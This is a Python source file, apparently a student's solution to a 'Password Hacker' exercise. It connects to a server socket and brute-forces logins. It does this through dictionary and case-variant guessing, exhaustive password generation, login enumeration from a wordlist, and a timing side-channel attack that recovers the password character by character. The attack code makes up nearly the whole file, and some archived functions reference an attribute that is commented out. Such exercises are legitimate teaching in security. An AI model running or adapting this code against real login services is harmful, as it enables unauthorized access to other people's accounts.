"""This programme is a simple password hacker."""
from sys import argv
import socket
from string import ascii_lowercase, ascii_uppercase, digits
import itertools
import json
from datetime import datetime, timedelta
from typing import Dict, Any, Tuple


class PasswordChecker:
    def __init__(self):
        self.ip_address: str = ""
        self.port: int = int()
        self.symbol_set = ascii_lowercase + ascii_uppercase + digits
        # self.attempt_limit: int = 1_000_000

    def get_password1(self):
        """This version of get_password() function didn't pass the tests. It works properly and I suppose faster then
        current version with generators and iterators, because this function didn't repeat combinations.
        It get words from a file and generate all possible combinations of upper and lower case for each letter
        for all words.
        """
        with open("/home/roman/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt") as file:
            for word in file:
                word = word.rstrip()
                letters_list = list(word)
                yield word
                if word.isnumeric():
                    continue
                else:
                    yield word.swapcase()
                for index in range(len(word)):
                    if letters_list[index].isalpha():
                        letters_list[index] = letters_list[index].upper()
                        word = "".join(letters_list)
                        yield word
                        yield word.swapcase()
                        letters_list[index] = letters_list[index].lower()
                    else:
                        continue

    def get_case_product(self, file_name: str):
        """Archive function - didn't used in the last version.
        It get words from a file and generate all possible combinations of upper and lower case for each letter
        for all words.
        """
        with open(file_name) as file:
            for word in file:
                word = word.rstrip()
                if word.isnumeric():
                    yield word
                    continue
                iterator = map(lambda x: "".join(x),
                               itertools.product(*((letter.lower(), letter.upper()) for letter in word)))
                for password in iterator:
                    yield password

    def test_password_from_list(self) -> None:
        """Archive function - didn't used in the last version.
        It uses dictionary-based brute force method to connect to a server.
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.ip_address, self.port))
            counter = 0
            for password in self.get_case_product(
                    "/home/roman/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt"):
                client_socket.send(password.encode())
                response = client_socket.recv(512).decode()
                if "Connection success!" in response:
                    print(password)
                    break
                counter += 1
                if counter == self.attempt_limit:
                    break

    def test_generated_password(self) -> None:
        """Archive function - didn't used in the last version.
        It generates passwords and uses simple brute force method to connect to a server.
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.ip_address, self.port))
            max_repetitions = 7
            counter = 0
            for quantity in range(1, max_repetitions):
                for symbols in itertools.product(self.symbol_set, repeat=quantity):
                    password = "".join(symbols)
                    client_socket.send(password.encode())
                    response = client_socket.recv(1024).decode()
                    if "Connection success!" in response:
                        print(password)
                        return None
                    counter += 1
                    if counter == self.attempt_limit:
                        return None

    def send_request_get_response(self, socket_alias, _login, _password) -> Tuple[str, Any, timedelta]:
        """It prepares json object, send it to the socket and get a response."""
        login_password: Dict[str, str] = {"login": _login, "password": _password}
        login_password_json = json.dumps(login_password)
        login_password_encoded = login_password_json.encode()
        socket_alias.send(login_password_encoded)
        start = datetime.now()
        response = socket_alias.recv(512)
        finish = datetime.now()
        response_decoded = response.decode()
        response = json.loads(response_decoded)
        _time_delta = finish - start
        return login_password_json, response, _time_delta

    def choose_login(self, client_socket) -> str:
        """It uses dictionary and different case generator to choose the login for a server."""
        # counter = 0
        password = " "
        for login in self.get_case_product(
                "/home/roman/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt"):
            login = login.rstrip()
            login_password_json, response, _ = self.send_request_get_response(client_socket, login, password)
            if "Wrong login!" in response["result"]:
                continue
            elif "Wrong password!" in response["result"]:
                return login

    def choose_password(self, client_socket, login) -> None:
        password_beginning = ""
        fitted_symbol = ""
        while True:
            max_delta = timedelta()
            for symbol in self.symbol_set:
                password = password_beginning + symbol
                login_password_json, response, time_delta = self.send_request_get_response(client_socket,
                                                                                           login, password)
                # counter += 1
                if "Connection success!" in response["result"]:
                    print(login_password_json)
                    return None
                if time_delta > max_delta:
                    max_delta = time_delta
                    fitted_symbol = symbol
            password_beginning += fitted_symbol
            # if counter >= self.attempt_limit:
            #     break

    def manage_socket(self) -> None:
        """
        After it begin to choose the password.
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.ip_address, self.port))
            login = self.choose_login(client_socket)
            self.choose_password(client_socket, login)
            return None

    def run_it(self) -> None:
        """It parses command line and runs the checking."""
        command_line_arguments = argv
        if len(command_line_arguments) == 3:  # I've commented the message variable and change equality statement.
            self.ip_address = command_line_arguments[1]
            self.port = int(command_line_arguments[2])
            # message = command_line_arguments[3]
            self.manage_socket()  # I've removed all arguments.
        else:
            print("The number of passed arguments is incorrect.")


if __name__ == "__main__":
    password_checker = PasswordChecker()
    password_checker.run_it()
